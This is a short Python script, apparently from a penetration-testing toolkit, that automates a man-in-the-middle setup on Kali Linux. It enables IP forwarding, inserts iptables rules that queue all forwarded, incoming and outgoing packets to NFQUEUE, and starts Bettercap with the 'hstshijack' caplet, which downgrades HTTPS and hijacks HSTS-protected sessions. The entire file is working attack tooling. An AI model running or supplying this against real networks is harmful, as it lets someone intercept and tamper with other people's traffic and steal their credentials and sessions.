#/usr/bin/env python
import subprocess
try:
	from subprocess import DEVNULL
except ImportError:
	import os
	# pylint: disable-msg=C0103
	DEVNULL = open(os.devnull, 'wb')

def enable_port_forwarding():
	print("[+] Enable Port Forwarding...")
	subprocess.call(
		'echo 1 | sudo tee "/proc/sys/net/ipv4/ip_forward"',
		shell=True,
		stdout=DEVNULL,
	)
	# Check to make sure this worked
	with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
		value = f.read().strip()
		if value == "1":
			print("[+] Port Forwarding enabled.")
		else:
			print("[-] Something went wrong.  Manually enable port forwarding.")
			exit()

def set_iptables():
	number = None
	yes_choice = {'yes', 'y'}
	no_choice = {'no', 'n'}

	print("[+] Setting iptables...")
	user_input = input("[+] Queue number is 0. Is this acceptable?").lower().strip()
	if user_input in yes_choice:
		number = 0
	if user_input in no_choice:
		number = input("Please provide a queue number: ").strip()
	print("[+] Queue number is: ", number)
	subprocess.call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(number), "--queue-bypass"])
	subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(number), "--queue-bypass"])
	subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(number), "--queue-bypass"])
	print("\n[+] Check the iptables have been set: ")
	subprocess.call(["sudo", "iptables", "-L"])
	# return the number to set in the queue call
	return number

def start_bettercap():
	try:
		interface = None
		yes_choice = {'yes', 'y'}
		no_choice = {'no', 'n'}

		print("[+] Starting Bettercap...")
		print("[+] eth0 is the default first wired interface in Kali Linux")
		user_input = input("[+] Is this an acceptable interface to use? y/n ").lower().strip()
		if user_input in yes_choice:
			interface = "eth0"
		if user_input in no_choice:
			interface = input("[+] Please provide an interface to use: ").lower().strip()
		print("[+] Interface selected is: ", interface)
		print("[+] Request, set bettercap iface to: " + interface)
		subprocess.call(["sudo", "bettercap", "-iface", interface, "-caplet", "hstshijack/hstshijack"])

	except Exception as e:
		print("[-] Something went wrong while starting Bettercap: ", e)

	except KeyboardInterrupt:
		print("\n[-] Ctrl-C detected. Shutting down... ")
		exit()

print("[+] Setting up environment...")

# 1. Enable Port Forwarding.
enable_port_forwarding()

# 2. Set IP Tables
set_iptables()

# 3. Start Bettercap
start_bettercap()
